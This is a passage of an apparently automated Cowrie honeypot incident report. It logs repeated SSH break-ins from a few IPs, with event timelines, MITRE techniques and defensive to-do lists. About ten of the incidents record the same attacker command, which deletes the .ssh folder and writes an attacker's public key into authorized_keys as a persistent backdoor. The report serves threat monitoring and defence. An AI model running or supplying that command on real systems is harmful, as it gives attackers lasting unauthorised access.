| `2026-06-13 05:46:22` | `cowrie.direct-tcpip.request` |
| `2026-06-13 05:46:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.39.63[.]46` to AbuseIPDB if not already reported
- [ ] Block `117.39.63[.]46` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7436d592be82

| Field | Detail |
|---|---|
| **Source IP** | `160.251.233[.]37` |
| **First Seen** | 2026-06-13 05:47 |
| **Last Seen** | 2026-06-13 05:47 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 05:47:21` | `cowrie.session.connect` |
| `2026-06-13 05:47:21` | `cowrie.client.version` |
| `2026-06-13 05:47:21` | `cowrie.client.kex` |
| `2026-06-13 05:47:22` | `cowrie.login.success` |
| `2026-06-13 05:47:22` | `cowrie.session.params` |
| `2026-06-13 05:47:22` | `cowrie.command.input` |
| `2026-06-13 05:47:22` | `cowrie.command.failed` |
| `2026-06-13 05:47:23` | `cowrie.log.closed` |
| `2026-06-13 05:47:23` | `cowrie.session.params` |
| `2026-06-13 05:47:23` | `cowrie.command.input` |
| `2026-06-13 05:47:23` | `cowrie.session.file_download` |
| `2026-06-13 05:47:23` | `cowrie.log.closed` |
| `2026-06-13 05:47:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.251.233[.]37` to AbuseIPDB if not already reported
- [ ] Block `160.251.233[.]37` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d87b91374d08

| Field | Detail |
|---|---|
| **Source IP** | `160.251.233[.]37` |
| **First Seen** | 2026-06-13 05:47 |
| **Last Seen** | 2026-06-13 05:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 05:47:25` | `cowrie.session.connect` |
| `2026-06-13 05:47:25` | `cowrie.client.version` |
| `2026-06-13 05:47:25` | `cowrie.client.kex` |
| `2026-06-13 05:47:26` | `cowrie.login.success` |
| `2026-06-13 05:47:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.251.233[.]37` to AbuseIPDB if not already reported
- [ ] Block `160.251.233[.]37` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57f6b0133695

| Field | Detail |
|---|---|
| **Source IP** | `160.251.233[.]37` |
| **First Seen** | 2026-06-13 05:51 |
| **Last Seen** | 2026-06-13 05:51 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 05:51:31` | `cowrie.session.connect` |
| `2026-06-13 05:51:31` | `cowrie.client.version` |
| `2026-06-13 05:51:31` | `cowrie.client.kex` |
| `2026-06-13 05:51:32` | `cowrie.login.success` |
| `2026-06-13 05:51:32` | `cowrie.session.params` |
| `2026-06-13 05:51:32` | `cowrie.command.input` |
| `2026-06-13 05:51:32` | `cowrie.command.failed` |
| `2026-06-13 05:51:32` | `cowrie.log.closed` |
| `2026-06-13 05:51:33` | `cowrie.session.params` |
| `2026-06-13 05:51:33` | `cowrie.command.input` |
| `2026-06-13 05:51:33` | `cowrie.session.file_download` |
| `2026-06-13 05:51:33` | `cowrie.log.closed` |
| `2026-06-13 05:51:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.251.233[.]37` to AbuseIPDB if not already reported
- [ ] Block `160.251.233[.]37` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2db9e9d75ccd

| Field | Detail |
|---|---|
| **Source IP** | `160.251.233[.]37` |
| **First Seen** | 2026-06-13 05:51 |
| **Last Seen** | 2026-06-13 05:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 05:51:35` | `cowrie.session.connect` |
| `2026-06-13 05:51:35` | `cowrie.client.version` |
| `2026-06-13 05:51:35` | `cowrie.client.kex` |
| `2026-06-13 05:51:36` | `cowrie.login.success` |
| `2026-06-13 05:51:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.251.233[.]37` to AbuseIPDB if not already reported
- [ ] Block `160.251.233[.]37` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f03b0f808f02

| Field | Detail |
|---|---|
| **Source IP** | `212.64.19[.]167` |
| **First Seen** | 2026-06-13 05:52 |
| **Last Seen** | 2026-06-13 05:52 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 05:52:16` | `cowrie.session.connect` |
| `2026-06-13 05:52:16` | `cowrie.client.version` |
| `2026-06-13 05:52:16` | `cowrie.client.kex` |
| `2026-06-13 05:52:17` | `cowrie.login.success` |
| `2026-06-13 05:52:17` | `cowrie.session.params` |
| `2026-06-13 05:52:17` | `cowrie.command.input` |
| `2026-06-13 05:52:17` | `cowrie.command.failed` |
| `2026-06-13 05:52:18` | `cowrie.log.closed` |
| `2026-06-13 05:52:18` | `cowrie.session.params` |
| `2026-06-13 05:52:18` | `cowrie.command.input` |
| `2026-06-13 05:52:18` | `cowrie.session.file_download` |
| `2026-06-13 05:52:18` | `cowrie.log.closed` |
| `2026-06-13 05:52:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.64.19[.]167` to AbuseIPDB if not already reported
- [ ] Block `212.64.19[.]167` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd590e14c4df

| Field | Detail |
|---|---|
| **Source IP** | `212.64.19[.]167` |
| **First Seen** | 2026-06-13 05:52 |
| **Last Seen** | 2026-06-13 05:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 05:52:20` | `cowrie.session.connect` |
| `2026-06-13 05:52:20` | `cowrie.client.version` |
| `2026-06-13 05:52:20` | `cowrie.client.kex` |
| `2026-06-13 05:52:21` | `cowrie.login.success` |
| `2026-06-13 05:52:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.64.19[.]167` to AbuseIPDB if not already reported
- [ ] Block `212.64.19[.]167` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d02ea660d9d1

| Field | Detail |
|---|---|
| **Source IP** | `118.26.39[.]178` |
| **First Seen** | 2026-06-13 05:52 |
| **Last Seen** | 2026-06-13 05:52 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 05:52:36` | `cowrie.session.connect` |
| `2026-06-13 05:52:36` | `cowrie.client.version` |
| `2026-06-13 05:52:36` | `cowrie.client.kex` |
| `2026-06-13 05:52:37` | `cowrie.login.success` |
| `2026-06-13 05:52:37` | `cowrie.session.params` |
| `2026-06-13 05:52:37` | `cowrie.command.input` |
| `2026-06-13 05:52:37` | `cowrie.command.failed` |
| `2026-06-13 05:52:37` | `cowrie.log.closed` |
| `2026-06-13 05:52:37` | `cowrie.session.params` |
| `2026-06-13 05:52:37` | `cowrie.command.input` |
| `2026-06-13 05:52:37` | `cowrie.session.file_download` |
| `2026-06-13 05:52:37` | `cowrie.log.closed` |
| `2026-06-13 05:52:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.26.39[.]178` to AbuseIPDB if not already reported
- [ ] Block `118.26.39[.]178` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9cb3cce477ff

| Field | Detail |
|---|---|
| **Source IP** | `118.26.39[.]178` |
| **First Seen** | 2026-06-13 05:52 |
| **Last Seen** | 2026-06-13 05:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 05:52:39` | `cowrie.session.connect` |
| `2026-06-13 05:52:39` | `cowrie.client.version` |
| `2026-06-13 05:52:39` | `cowrie.client.kex` |
| `2026-06-13 05:52:40` | `cowrie.login.success` |
| `2026-06-13 05:52:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.26.39[.]178` to AbuseIPDB if not already reported
- [ ] Block `118.26.39[.]178` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-683bb84cc3aa

| Field | Detail |
|---|---|
| **Source IP** | `160.251.233[.]37` |
| **First Seen** | 2026-06-13 05:53 |
| **Last Seen** | 2026-06-13 05:53 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 05:53:40` | `cowrie.session.connect` |
| `2026-06-13 05:53:40` | `cowrie.client.version` |
| `2026-06-13 05:53:40` | `cowrie.client.kex` |
| `2026-06-13 05:53:41` | `cowrie.login.success` |
| `2026-06-13 05:53:41` | `cowrie.session.params` |
| `2026-06-13 05:53:41` | `cowrie.command.input` |
| `2026-06-13 05:53:41` | `cowrie.command.failed` |
| `2026-06-13 05:53:42` | `cowrie.log.closed` |
| `2026-06-13 05:53:42` | `cowrie.session.params` |
| `2026-06-13 05:53:42` | `cowrie.command.input` |
| `2026-06-13 05:53:42` | `cowrie.session.file_download` |
| `2026-06-13 05:53:42` | `cowrie.log.closed` |
| `2026-06-13 05:53:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.251.233[.]37` to AbuseIPDB if not already reported
- [ ] Block `160.251.233[.]37` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad4b378375cf

| Field | Detail |
|---|---|
| **Source IP** | `160.251.233[.]37` |
| **First Seen** | 2026-06-13 05:53 |
| **Last Seen** | 2026-06-13 05:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 05:53:44` | `cowrie.session.connect` |
| `2026-06-13 05:53:44` | `cowrie.client.version` |
| `2026-06-13 05:53:44` | `cowrie.client.kex` |
| `2026-06-13 05:53:45` | `cowrie.login.success` |
| `2026-06-13 05:53:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.251.233[.]37` to AbuseIPDB if not already reported
- [ ] Block `160.251.233[.]37` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78ddc89a36e1

| Field | Detail |
|---|---|
| **Source IP** | `212.64.19[.]167` |
| **First Seen** | 2026-06-13 05:55 |
| **Last Seen** | 2026-06-13 05:55 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 05:55:44` | `cowrie.session.connect` |
| `2026-06-13 05:55:44` | `cowrie.client.version` |
| `2026-06-13 05:55:44` | `cowrie.client.kex` |
| `2026-06-13 05:55:44` | `cowrie.login.success` |
| `2026-06-13 05:55:45` | `cowrie.session.params` |
| `2026-06-13 05:55:45` | `cowrie.command.input` |
| `2026-06-13 05:55:45` | `cowrie.command.failed` |
| `2026-06-13 05:55:45` | `cowrie.log.closed` |
| `2026-06-13 05:55:45` | `cowrie.session.params` |
| `2026-06-13 05:55:45` | `cowrie.command.input` |
| `2026-06-13 05:55:45` | `cowrie.session.file_download` |
| `2026-06-13 05:55:45` | `cowrie.log.closed` |
| `2026-06-13 05:55:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.64.19[.]167` to AbuseIPDB if not already reported
- [ ] Block `212.64.19[.]167` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34c6a50eb8e7

| Field | Detail |
|---|---|
| **Source IP** | `160.251.233[.]37` |
| **First Seen** | 2026-06-13 05:55 |
| **Last Seen** | 2026-06-13 05:55 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 05:55:44` | `cowrie.session.connect` |
| `2026-06-13 05:55:44` | `cowrie.client.version` |
| `2026-06-13 05:55:44` | `cowrie.client.kex` |
| `2026-06-13 05:55:45` | `cowrie.login.success` |
| `2026-06-13 05:55:45` | `cowrie.session.params` |
| `2026-06-13 05:55:45` | `cowrie.command.input` |
| `2026-06-13 05:55:45` | `cowrie.command.failed` |
| `2026-06-13 05:55:45` | `cowrie.log.closed` |
| `2026-06-13 05:55:46` | `cowrie.session.params` |
| `2026-06-13 05:55:46` | `cowrie.command.input` |
| `2026-06-13 05:55:46` | `cowrie.session.file_download` |
| `2026-06-13 05:55:46` | `cowrie.log.closed` |
| `2026-06-13 05:55:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.251.233[.]37` to AbuseIPDB if not already reported
- [ ] Block `160.251.233[.]37` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e18bc6b41995

| Field | Detail |
|---|---|
| **Source IP** | `212.64.19[.]167` |
| **First Seen** | 2026-06-13 05:55 |
| **Last Seen** | 2026-06-13 05:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 05:55:47` | `cowrie.session.connect` |
| `2026-06-13 05:55:47` | `cowrie.client.version` |
| `2026-06-13 05:55:48` | `cowrie.client.kex` |
| `2026-06-13 05:55:48` | `cowrie.login.success` |
| `2026-06-13 05:55:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.64.19[.]167` to AbuseIPDB if not already reported
- [ ] Block `212.64.19[.]167` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85da1a903378

| Field | Detail |
|---|---|
| **Source IP** | `160.251.233[.]37` |
| **First Seen** | 2026-06-13 05:55 |
| **Last Seen** | 2026-06-13 05:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 05:55:48` | `cowrie.session.connect` |
| `2026-06-13 05:55:48` | `cowrie.client.version` |
| `2026-06-13 05:55:48` | `cowrie.client.kex` |
| `2026-06-13 05:55:49` | `cowrie.login.success` |
| `2026-06-13 05:55:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.251.233[.]37` to AbuseIPDB if not already reported
- [ ] Block `160.251.233[.]37` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c05aa698d3bb

| Field | Detail |
|---|---|
| **Source IP** | `212.64.19[.]167` |
| **First Seen** | 2026-06-13 05:58 |
| **Last Seen** | 2026-06-13 05:58 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 05:58:13` | `cowrie.session.connect` |
| `2026-06-13 05:58:13` | `cowrie.client.version` |
| `2026-06-13 05:58:13` | `cowrie.client.kex` |
| `2026-06-13 05:58:13` | `cowrie.login.success` |
| `2026-06-13 05:58:14` | `cowrie.session.params` |
| `2026-06-13 05:58:14` | `cowrie.command.input` |
| `2026-06-13 05:58:14` | `cowrie.command.failed` |
| `2026-06-13 05:58:14` | `cowrie.log.closed` |
| `2026-06-13 05:58:14` | `cowrie.session.params` |
| `2026-06-13 05:58:14` | `cowrie.command.input` |
| `2026-06-13 05:58:14` | `cowrie.session.file_download` |
| `2026-06-13 05:58:14` | `cowrie.log.closed` |
| `2026-06-13 05:58:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.64.19[.]167` to AbuseIPDB if not already reported
- [ ] Block `212.64.19[.]167` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f4d218706f0

| Field | Detail |
|---|---|
| **Source IP** | `212.64.19[.]167` |
| **First Seen** | 2026-06-13 05:58 |
| **Last Seen** | 2026-06-13 05:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 05:58:16` | `cowrie.session.connect` |
| `2026-06-13 05:58:16` | `cowrie.client.version` |
| `2026-06-13 05:58:16` | `cowrie.client.kex` |
| `2026-06-13 05:58:17` | `cowrie.login.success` |
| `2026-06-13 05:58:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.64.19[.]167` to AbuseIPDB if not already reported
- [ ] Block `212.64.19[.]167` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ef773ae8259

| Field | Detail |
|---|---|
| **Source IP** | `160.251.233[.]37` |
| **First Seen** | 2026-06-13 05:59 |
| **Last Seen** | 2026-06-13 05:59 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
